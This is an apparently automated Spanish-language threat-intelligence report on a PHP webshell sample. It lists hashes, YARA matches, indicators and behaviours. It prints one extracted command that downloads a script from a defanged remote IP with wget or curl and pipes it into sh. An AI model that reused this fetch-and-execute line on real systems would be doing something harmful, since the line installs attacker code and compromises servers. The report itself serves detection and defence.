# 🧬 Payload Analysis

`42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis. **Ficha malware:** [malware-like/oraculo/webshell/42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f.md](../../../../../malware-like/oraculo/webshell/42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f.md)


## 🏷️ Clasificación

- **Categoría:** `Web shell`
- **Familia:** `webshell`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:31:49.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f`
- **MD5:** `59ccf9dfda6ed1a7df04b630bc9f6960`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.6 |
| Strings | 101 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: webshell
YARA match: webshell
YARA match: webshell
YARA match: webshell
YARA match: webshell
YARA match: webshell
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; strings=101; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.164.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 42693a406e3c43c2c0d649f27cf04d4416af0e49004fdb670d47bf627c85717f | static_analysis |
| ip | 89.126.211.XXX | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_PHP_Webshell |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
